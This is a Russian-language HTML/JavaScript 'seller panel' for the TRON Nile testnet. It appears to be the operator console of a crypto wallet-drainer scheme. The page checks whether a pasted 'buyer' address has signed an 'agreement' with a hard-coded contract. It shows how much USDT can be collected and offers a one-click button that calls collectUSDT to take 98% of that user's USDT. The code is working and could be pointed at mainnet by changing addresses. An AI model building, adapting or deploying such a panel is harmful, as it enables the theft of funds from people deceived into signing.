<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
    <title>Панель Продавца — Nile Testnet</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #3375BB; --primary-dark: #1a5fb4; --accent: #00D4AA;
            --bg-dark: #0B0E11; --bg-card: #151A21; --bg-hover: #1C2128;
            --text-primary: #FFFFFF; --text-secondary: #8B949E; --border: #2D333B;
            --success: #00D4AA; --error: #ff4757; --warning: #FFA500;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-dark); color: var(--text-primary);
            line-height: 1.6; min-height: 100vh;
        }
        .header {
            background: var(--bg-card); border-bottom: 1px solid var(--border);
            padding: 1rem 2rem; position: sticky; top: 0; z-index: 100;
            display: flex; justify-content: space-between; align-items: center;
        }
        .logo { display: flex; align-items: center; gap: 0.75rem; }
        .logo-icon {
            width: 40px; height: 40px; background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
            border-radius: 10px; display: flex; align-items: center; justify-content: center;
            font-weight: 800; font-size: 1.2rem;
        }
        .logo-text h1 { font-size: 1.25rem; font-weight: 600; }
        .logo-text span { font-size: 0.75rem; color: var(--text-secondary); }
        .wallet-status {
            display: flex; align-items: center; gap: 0.75rem;
            background: var(--bg-hover); padding: 0.5rem 1rem;
            border-radius: 50px; border: 1px solid var(--border);
        }
        .wallet-status.connected { border-color: var(--success); }
        .status-dot {
            width: 8px; height: 8px; border-radius: 50%;
            background: var(--error); animation: pulse 2s infinite;
        }
        .wallet-status.connected .status-dot { background: var(--success); }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .wallet-address { font-family: monospace; font-size: 0.85rem; }
        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
        .connect-warning {
            background: linear-gradient(135deg, rgba(255, 71, 87, 0.1) 0%, rgba(255, 165, 0, 0.1) 100%);
            border: 1px solid var(--error); border-radius: 16px;
            padding: 2rem; text-align: center; margin-bottom: 2rem;
        }
        .connect-warning h2 { color: var(--error); margin-bottom: 1rem; }
        .btn-primary {
            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
            color: white; border: none; padding: 1rem 2rem;
            border-radius: 12px; font-weight: 600; cursor: pointer;
            font-size: 1rem; display: inline-flex; align-items: center; gap: 0.5rem;
        }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(51, 117, 187, 0.3); }
        .spinner {
            width: 20px; height: 20px; border: 2px solid transparent;
            border-top-color: white; border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .stats-grid {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem; margin-bottom: 2rem;
        }
        .stat-card {
            background: var(--bg-card); border: 1px solid var(--border);
            border-radius: 16px; padding: 1.5rem;
        }
        .stat-card h3 {
            font-size: 0.875rem; color: var(--text-secondary);
            text-transform: uppercase; letter-spacing: 0.05em;
            margin-bottom: 0.5rem;
        }
        .stat-value { font-size: 2rem; font-weight: 700; color: var(--accent); }
        .main-card {
            background: var(--bg-card); border: 1px solid var(--border);
            border-radius: 16px; padding: 2rem; margin-bottom: 2rem;
        }
        .form-group { margin-bottom: 1.5rem; }
        .form-group label {
            display: block; margin-bottom: 0.5rem;
            color: var(--text-secondary); font-size: 0.875rem;
        }
        .input-group {
            display: flex; gap: 0.75rem;
            background: var(--bg-hover); border: 1px solid var(--border);
            border-radius: 12px; padding: 0.5rem;
        }
        .input-group input {
            flex: 1; background: transparent; border: none;
            color: var(--text-primary); padding: 0.75rem;
            font-size: 1rem; outline: none;
        }
        .btn-icon {
            background: var(--primary); border: none; color: white;
            padding: 0.75rem 1rem; border-radius: 8px; cursor: pointer;
        }
        .user-info {
            background: var(--bg-hover); border: 1px solid var(--border);
            border-radius: 12px; padding: 1.5rem; margin-top: 1.5rem;
            display: none;
        }
        .user-info.visible { display: block; }
        .info-row {
            display: flex; justify-content: space-between; align-items: center;
            padding: 0.75rem 0; border-bottom: 1px solid var(--border);
        }
        .badge {
            padding: 0.25rem 0.75rem; border-radius: 20px;
            font-size: 0.75rem; font-weight: 600;
        }
        .badge-success { background: rgba(0, 212, 170, 0.2); color: var(--success); }
        .badge-error { background: rgba(255, 71, 87, 0.2); color: var(--error); }
        .badge-warning { background: rgba(255, 165, 0, 0.2); color: var(--warning); }
        .btn-collect {
            width: 100%; padding: 1.25rem;
            background: linear-gradient(135deg, var(--success) 0%, var(--primary) 100%);
            color: white; border: none; border-radius: 12px;
            font-weight: 700; font-size: 1.1rem; cursor: pointer;
        }
        .status-message {
            padding: 1rem; border-radius: 12px; margin-top: 1rem;
            display: none;
        }
        .status-message.visible { display: block; }
        .status-message.success {
            background: rgba(0, 212, 170, 0.1); border: 1px solid var(--success); color: var(--success);
        }
        .status-message.error {
            background: rgba(255, 71, 87, 0.1); border: 1px solid var(--error); color: var(--error);
        }
        .contract-info {
            background: rgba(51, 117, 187, 0.05); border: 1px solid var(--border);
            border-radius: 12px; padding: 1rem; margin-bottom: 2rem;
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 1rem;
        }
        .contract-address {
            font-family: monospace; background: var(--bg-hover);
            padding: 0.5rem 1rem; border-radius: 8px; font-size: 0.875rem;
        }
        .loading-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: var(--bg-dark); z-index: 9999;
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; gap: 1.5rem;
        }
        .loading-overlay.hidden { display: none; }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingScreen">
        <div class="logo-icon" style="width: 60px; height: 60px;">💰</div>
        <div style="font-size: 1.25rem; font-weight: 600;">Панель Продавца</div>
        <div class="spinner" style="width: 50px; height: 50px; border: 3px solid var(--border); border-top-color: var(--primary);"></div>
        <div style="color: var(--text-secondary);">Nile Testnet</div>
    </div>

    <header class="header">
        <div class="logo">
            <div class="logo-icon">💰</div>
            <div class="logo-text">
                <h1>Панель Продавца</h1>
                <span>Nile Testnet</span>
            </div>
        </div>
        <div class="wallet-status" id="walletStatus">
            <div class="status-dot"></div>
            <span class="wallet-address" id="walletAddress">Не подключено</span>
        </div>
    </header>

    <div class="container">
        <div class="connect-warning" id="connectWarning">
            <h2>⚠️ Требуется подключение</h2>
            <p>Подключите TronLink на Nile Testnet</p>
            <button class="btn-primary" onclick="connectWallet()" id="connectBtn">
                <span id="btnText">Подключить</span>
            </button>
        </div>

        <div id="mainContent" style="display: none;">
            <div class="contract-info">
                <div>
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">Контракт:</div>
                </div>
                <div class="contract-address">TQmnjYQbsQKmaihohjXHZNruEJ5K4oyRyV</div>
            </div>

            <div class="stats-grid">
                <div class="stat-card">
                    <h3>Всего собрано</h3>
                    <div class="stat-value" id="totalCollected">0 USDT</div>
                </div>
                <div class="stat-card">
                    <h3>Проверок сегодня</h3>
                    <div class="stat-value" id="checksToday">0</div>
                </div>
            </div>

            <div class="main-card">
                <h2>🔍 Проверка и сбор средств</h2>

                <div class="form-group">
                    <label>Адрес покупателя</label>
                    <div class="input-group">
                        <input type="text" id="userAddress" placeholder="TM... или TQ... (начинается с T)">
                        <button class="btn-icon" onclick="pasteAddress()">📋</button>
                    </div>
                </div>

                <div class="form-group">
                    <label>Адрес USDT (Nile Testnet)</label>
                    <div class="input-group">
                        <input type="text" id="usdtAddress" value="TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf">
                        <button class="btn-icon" onclick="resetUsdt()">↺</button>
                    </div>
                </div>

                <button class="btn-primary" onclick="checkUser()" id="checkBtn" style="width: 100%;">
                    <span id="checkBtnText">Проверить</span>
                </button>

                <div class="user-info" id="userInfo">
                    <div class="info-row">
                        <span style="color: var(--text-secondary);">Подписан:</span>
                        <span id="signStatus"></span>
                    </div>
                    <div class="info-row">
                        <span style="color: var(--text-secondary);">Собрано:</span>
                        <span id="collectStatus"></span>
                    </div>
                    <div class="info-row">
                        <span style="color: var(--text-secondary);">Доступно:</span>
                        <span id="availableAmount" style="color: var(--accent); font-weight: 700;"></span>
                    </div>
                </div>

                <div id="collectSection" style="display: none; margin-top: 1.5rem;">
                    <button class="btn-collect" onclick="collectFunds()" id="collectBtn">
                        💸 Собрать 98% USDT
                    </button>
                    <div class="status-message" id="collectStatusMsg"></div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
    <script>
        const CONTRACT_ADDRESS = 'TQmnjYQbsQKmaihohjXHZNruEJ5K4oyRyV';
        const DEFAULT_USDT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';

        const CONTRACT_ABI = [
            {"inputs":[],"name":"signAgreement","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"name":"","type":"address"}],"name":"signed","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"name":"","type":"address"}],"name":"collected","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
        ];

        let tronWeb, contract, userAddress, currentUserData = null;

        window.addEventListener('load', async () => {
            if (window.tronWeb?.ready) {
                await initApp();
            } else {
                document.getElementById('loadingScreen').classList.add('hidden');
            }
        });

        async function connectWallet() {
            const btn = document.getElementById('connectBtn');
            btn.innerHTML = '<div class="spinner"></div> Подключение...';

            try {
                if (window.tronLink?.request) {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                }
                await initApp();
            } catch (e) {
                alert(e.message);
                btn.innerHTML = 'Подключить';
            }
        }

        async function initApp() {
            try {
                tronWeb = window.tronLink?.tronWeb || window.tronWeb;
                userAddress = tronWeb.defaultAddress.base58;
                contract = tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);

                document.getElementById('walletStatus').classList.add('connected');
                document.getElementById('walletAddress').textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
                document.getElementById('connectWarning').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
                document.getElementById('loadingScreen').classList.add('hidden');
            } catch (e) {
                alert('Ошибка: ' + e.message);
            }
        }

        async function pasteAddress() {
            const text = await navigator.clipboard.readText();
            document.getElementById('userAddress').value = text.trim();
        }

        function resetUsdt() {
            document.getElementById('usdtAddress').value = DEFAULT_USDT;
        }

        async function checkUser() {
            const user = document.getElementById('userAddress').value.trim();
            const usdt = document.getElementById('usdtAddress').value.trim();

            if (!user || !user.startsWith('T')) {
                alert('Введите корректный адрес (начинается с T)');
                return;
            }

            document.getElementById('checkBtn').disabled = true;
            document.getElementById('checkBtnText').textContent = 'Проверка...';

            try {
                const isSigned = await contract.signed(user).call();
                const isCollected = await contract.collected(user).call();
                const amount = await contract.checkCollectable(user, usdt).call();

                document.getElementById('signStatus').innerHTML = isSigned 
                    ? '<span class="badge badge-success">✅ Да</span>' 
                    : '<span class="badge badge-error">❌ Нет</span>';
                document.getElementById('collectStatus').innerHTML = isCollected
                    ? '<span class="badge badge-success">✅ Да</span>'
                    : '<span class="badge badge-warning">⏳ Нет</span>';
                document.getElementById('availableAmount').textContent = (amount / 1e6).toFixed(2) + ' USDT';

                document.getElementById('userInfo').classList.add('visible');

                if (amount > 0 && !isCollected && isSigned) {
                    document.getElementById('collectSection').style.display = 'block';
                    currentUserData = { user, usdt, amount };
                } else {
                    document.getElementById('collectSection').style.display = 'none';
                }
            } catch (e) {
                alert('Ошибка: ' + e.message);
            } finally {
                document.getElementById('checkBtn').disabled = false;
                document.getElementById('checkBtnText').textContent = 'Проверить';
            }
        }

        async function collectFunds() {
            if (!currentUserData) return;
            const { user, usdt } = currentUserData;

            const btn = document.getElementById('collectBtn');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner" style="border-top-color: white;"></div> Сбор...';

            try {
                const tx = await contract.collectUSDT(user, usdt).send({
                    feeLimit: 100000000,
                    callValue: 0
                });

                document.getElementById('collectStatusMsg').className = 'status-message success visible';
                document.getElementById('collectStatusMsg').innerHTML = '✅ Успешно! TX: ' + tx.slice(0, 20) + '...';
                btn.innerHTML = '✅ Собрано';
            } catch (e) {
                document.getElementById('collectStatusMsg').className = 'status-message error visible';
                document.getElementById('collectStatusMsg').textContent = '❌ ' + e.message;
                btn.disabled = false;
                btn.innerHTML = '💸 Собрать 98% USDT';
            }
        }
    </script>
</body>
</html>
